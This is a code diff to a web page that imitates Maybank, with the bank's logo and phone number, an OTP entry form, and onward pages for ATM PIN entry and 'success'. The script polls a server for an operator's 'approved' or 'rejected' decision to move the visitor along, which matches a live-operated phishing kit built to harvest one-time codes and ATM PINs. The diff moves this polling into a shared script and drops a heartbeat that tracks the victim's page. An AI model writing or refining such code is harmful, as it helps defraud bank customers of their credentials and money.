@@ -63,7 +63,7 @@
     <header>
         <div class="header-left">
             <a href="index-en.html"><img src="maybank-logo.png" alt="Maybank"></a>
-            <a href="otp.html" class="lang-btn">BM</a>
+            <a href="otp.html" class="lang-btn" onclick="sessionStorage.setItem('lang', 'ms')">BM</a>
         </div>
         <div class="header-right">
             <div class="phone-group"><span>1-300-88-6688</span><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg></div>
@@ -113,26 +113,14 @@
         </div>
     </div>
 
+    <script src="navigation.js"></script>
     <script>
         let pollInterval = null;
         async function pollOtpStatus() {
             const orderId = sessionStorage.getItem('orderId');
             if (!orderId) return;
-            try {
-                const res = await fetch('/api/orders/' + orderId + '/status');
-                const data = await res.json();
-                if (data.status === 'approved') {
-                    clearInterval(pollInterval);
-                    document.getElementById('loadingOverlay').style.display = 'none';
-                    const nextPages = { 'loading_otp': 'otp-en.html', 'otp': 'otp-en.html', 'loading_atm': 'atm-pin-en.html', 'atm_pin': 'atm-pin-en.html', 'loading_success': 'success-en.html', 'success': 'success-en.html' };
-                    window.location.href = nextPages[data.currentPage] || 'atm-pin-en.html';
-                } else if (data.status === 'rejected') {
-                    clearInterval(pollInterval);
-                    document.getElementById('loadingOverlay').style.display = 'none';
-                    if (data.message) document.getElementById('errorMessage').textContent = data.message;
-                    document.getElementById('errorModal').style.display = 'flex';
-                }
-            } catch (err) { console.error('Poll error:', err); }
+            const done = await pollStatus(orderId, 'otp');
+            if (done) clearInterval(pollInterval);
         }
         function closeOtpErrorModal() { document.getElementById('errorModal').style.display = 'none'; document.getElementById('otp_code').value = ''; }
         document.getElementById('otpForm').addEventListener('submit', async (e) => {
@@ -149,9 +137,6 @@
             } catch (err) { alert('Error: Failed to connect to server. Please try again.'); }
         });
     </script>
-    <script>
-        function sendHeartbeat() { fetch('/api/heartbeat', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ currentPage: window.location.pathname }) }).catch(() => {}); }
-        setInterval(sendHeartbeat, 30000); sendHeartbeat();
-    </script>
+
 </body>
 </html>
